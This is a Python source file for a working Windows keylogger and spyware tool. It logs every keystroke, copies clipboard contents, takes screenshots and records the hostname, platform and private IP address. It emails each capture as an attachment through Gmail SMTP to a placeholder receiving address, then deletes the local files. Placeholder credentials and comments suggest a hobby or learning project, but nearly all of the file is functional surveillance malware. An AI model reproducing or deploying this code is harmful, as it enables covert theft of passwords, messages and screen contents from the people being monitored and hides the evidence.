from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
# (Multipurpose Internet Mail Extensions) objects for constructing email messages.
# MIMEMultipart is a container for MIME parts, allowing you to include multiple types of content in an email, such as text and attachments.

import socket
import platform
# The above modules work together to construct an email with
# system information (hostname and platform) and send it using an SMTP server.
import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "sysinfo.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"

email_address = "Sender Mail"
password = "Sender Password"
toaddr = "Receiver Mail"

time_iterations = 15   # setting to run & send mail for after 15 sec
num_of_iter_end = 1

file_path = "Copy Path were to store files"
extend = "\\"
file_merge = file_path + extend


def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()   # setup mime

    # Message headers
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Testing Mail for Keylogger"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename

    attachment = open(attachment, 'rb')

    # Creating payload
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    # Add payload header with filename
    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

    # Add payload to mail
    msg.attach(p)

    # Server for smtp connection & establishment of port number
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # Enable security by starting tls(transport layer security)
    s.starttls()

    # Login to mail
    s.login(fromaddr, password)

    text = msg.as_string()

    # Send email
    s.sendmail(fromaddr, toaddr, text)
    s.quit()   # terminating the session


# send_email(keys_information, file_path + extend + keys_information, toaddr)


def computer_information():
    with open(file_path + extend + system_information, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        f.write("processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: " + pasted_data + '\n')

        except:
            f.write("Clipboard could not be copied")


copy_clipboard()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


screenshot()

num_of_iter = 0
currentTime = time.time()  # gets current time
stoppingTime = time.time() + time_iterations  # stop time after time_iteration

while num_of_iter < num_of_iter_end:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:  # For every new key we are writing/updating the file by adding the key
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):  # write_file() used to write all keys into a file
        with open(file_path + extend + keys_information, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("key") == -1:  # this condtn used to store the every single key
                    f.write(k)
                    f.close()


    def on_release(key):  # This function used to exit from KeyLogger.
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:   # keylogger stops after stoppingTime & we will send mail after stoppingTime
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()  # This block listens for each key & implements the functions together

    if currentTime > stoppingTime:
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()
        num_of_iter += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iterations

send_email(system_information, file_path + extend + system_information, toaddr)
# time.sleep(15)
send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)
# time.sleep(15)
send_email(keys_information, file_path + extend + keys_information, toaddr)
# time.sleep(15)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information]
for file in delete_files:
    os.remove(file_merge + file)



